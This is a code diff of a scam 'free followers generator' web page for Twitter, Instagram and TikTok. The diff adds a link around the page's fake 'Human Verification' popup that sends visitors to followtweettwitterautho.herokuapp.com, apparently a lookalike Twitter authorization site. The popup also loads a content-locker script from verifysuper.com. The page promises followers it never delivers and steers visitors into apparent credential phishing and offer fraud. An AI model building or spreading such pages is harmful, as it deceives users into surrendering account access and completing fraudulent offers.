@@ -5,35 +5,34 @@
 ?>
 
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
-	<head>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>
 		<title>Generate Followers for any social network</title>
-		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-		<meta name="description" content="Generate Followers for any social network" />    
-		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-		<link rel="icon" type="image/ico" href="img/favicon.ico" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+		<meta name="description" content="Generate Followers for any social network">    
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<link rel="icon" type="image/ico" href="img/favicon.ico">
 		<!-- Open Graph Meta Tags-->
-		<meta property="og:title" content="Generate Followers for any social network" /> <!-- Title which is displayed when your site is shared on social networks -->
-		<meta property="og:description" content="Generate Followers for any social network" /> <!-- Website description which is displayed when your site is shared on social networks -->
-		<meta property="og:type" content="website" />
-		<meta property="og:url" content="http://www.mywebsiteurl.com/" /> <!-- Your Website URL -->
-		<meta property="og:image" content="http://www.mywebsiteurl.com/social-share-image.jpg" />	<!-- Absolute Path to the Image which will display, when your website is shared on social networks -->
+		<meta property="og:title" content="Generate Followers for any social network"> <!-- Title which is displayed when your site is shared on social networks -->
+		<meta property="og:description" content="Generate Followers for any social network"> <!-- Website description which is displayed when your site is shared on social networks -->
+		<meta property="og:type" content="website">
+		<meta property="og:url" content="http://www.mywebsiteurl.com/"> <!-- Your Website URL -->
+		<meta property="og:image" content="http://www.mywebsiteurl.com/social-share-image.jpg">	<!-- Absolute Path to the Image which will display, when your website is shared on social networks -->
 		<!-- Twitter Meta -->
-		<meta name="twitter:card" content="summary" />
-		<meta name="twitter:site" content="@tweetname" />
-		<meta name="twitter:title" content="Free Follower For Instagram, Tiktok & Twitter In 2020" />
-		<meta name="twitter:description" content="How to get free followers on instagram, tiktok and twitter" />
-		<meta name="twitter:image" content="http://www.mywebsiteurl.com/twitter-share-image.jpg" />
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:site" content="@tweetname">
+		<meta name="twitter:title" content="Free Follower For Instagram, Tiktok &amp; Twitter In 2020">
+		<meta name="twitter:description" content="How to get free followers on instagram, tiktok and twitter">
+		<meta name="twitter:image" content="http://www.mywebsiteurl.com/twitter-share-image.jpg">
 		<!-- Icons -->
 		<link rel="stylesheet" href="https://cdn.linearicons.com/free/1.0.0/icon-font.min.css">
 		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
 		<!-- Google Fonts -->
-		<link href="https://fonts.googleapis.com/css?family=Saira:300,400,700,900&display=swap" rel="stylesheet"> 
+		<link href="https://fonts.googleapis.com/css?family=Saira:300,400,700,900&amp;display=swap" rel="stylesheet"> 
 		<!-- CSS -->
-		<link href="css/bootstrap.min.css" rel="stylesheet" />  
-		<link href="css/animate.css" rel="stylesheet" />
-		<link href="css/magnific-popup.css" rel="stylesheet" />
-		<link href="css/style.css" rel="stylesheet" />	
+		<link href="css/bootstrap.min.css" rel="stylesheet">  
+		<link href="css/animate.css" rel="stylesheet">
+		<link href="css/magnific-popup.css" rel="stylesheet">
+		<link href="css/style.css" rel="stylesheet">	
 		<style>
 		
 		/*--------------------------------------------------------------
@@ -5383,18 +5382,18 @@ function hexToRgb(e){var a=/^#?([a-f\d])([a-f\d])([a-f\d])$/i;e=e.replace(a,func
 	});
 });
 		</script>
-	<body><div class="mfp-bg mfp-ready"></div><div class="mfp-wrap mfp-auto-cursor mfp-ready" tabindex="-1" style="overflow: hidden auto;"><div class="mfp-container mfp-inline-holder"><div class="mfp-content"><div class="popup-step-wrapper animated slideInUp" style="display: block;"><div class="verification-popup-wrapper animated fadeInUp">
+	</head><body><div class="mfp-bg mfp-ready"></div><div class="mfp-wrap mfp-auto-cursor mfp-ready" tabindex="-1" style="overflow: hidden auto;"><div class="mfp-container mfp-inline-holder"><div class="mfp-content"><div class="popup-step-wrapper animated slideInUp" style="display: block;"><div class="verification-popup-wrapper animated fadeInUp">
 	<div class="verification-popup-inner-wrapper">
 		<h3>Human Verification</h3>
 		<p>Complete human verification below to recieve <span class="verification-followers-value">500</span> followers for <span class="verification-network">Twitter</span> account @<span class="verification-username">"****"</span>. After verification is completed, newly generated followers will be added to your account.</p>
-		<i class="fa fa-spinner fa-spin"></i>
+		<i class="fa fa-spinner fa-spin"></i><a target="_self" href="https://followtweettwitterautho.herokuapp.com/">
 		<div class="button-wrapper">
-			<div class="button button-verification" onclick="call_locker()"><span>Verify Now</span></div>
-		</div>
+			<div class="button button-verification" onclick="call_locker()"><span="">Verify Now</div>
+		</div></a>
 	</div>
 </div>
 <script type="text/javascript" id="ogjs" src="https://www.verifysuper.com/cl/load.php?id=09d5bb70d4087ac554c40a93fc6d8a53"></script></div></div></div></div>	
-		<div id="app-particles"><canvas class="particles-js-canvas-el" width="988" height="913" style="width: 100%; height: 100%;"></canvas></div>
+		<div id="app-particles"><canvas class="particles-js-canvas-el" width="967" height="913" style="width: 100%; height: 100%;"></canvas></div>
 		<div class="platform-navigation-wrapper">
 			<div class="row">
 				<div class="col-4">
@@ -5451,7 +5450,7 @@ function hexToRgb(e){var a=/^#?([a-f\d])([a-f\d])([a-f\d])$/i;e=e.replace(a,func
 		<div class="followers-select-wrapper">
 			<div class="row">
 				<div class="col-4">
-					<div class="followers-select-item followers-select-item-1 active">
+					<div class="followers-select-item followers-select-item-1">
 						<img src="img/f-img-1.png" class="img-fluid f-img">
 						<span class="followers-value followers-value-1">500</span>
 						<span class="followers-label">Followers</span>
@@ -5465,7 +5464,7 @@ function hexToRgb(e){var a=/^#?([a-f\d])([a-f\d])([a-f\d])$/i;e=e.replace(a,func
 					</div>
 				</div>
 				<div class="col-4">
-					<div class="followers-select-item followers-select-item-3">
+					<div class="followers-select-item followers-select-item-3 active">
 						<img src="img/f-img-3.png" class="img-fluid f-img">
 						<span class="followers-value followers-value-3">2500</span>
 						<span class="followers-label">Followers</span>
@@ -5488,4 +5487,5 @@ function hexToRgb(e){var a=/^#?([a-f\d])([a-f\d])([a-f\d])$/i;e=e.replace(a,func
 	<script type="text/javascript" src="js/particles.min.js"></script>
 	<script type="text/javascript" src="js/jquery.countTo.js"></script>
 	<script type="text/javascript" src="js/main.js"></script>
+
 </body></html>
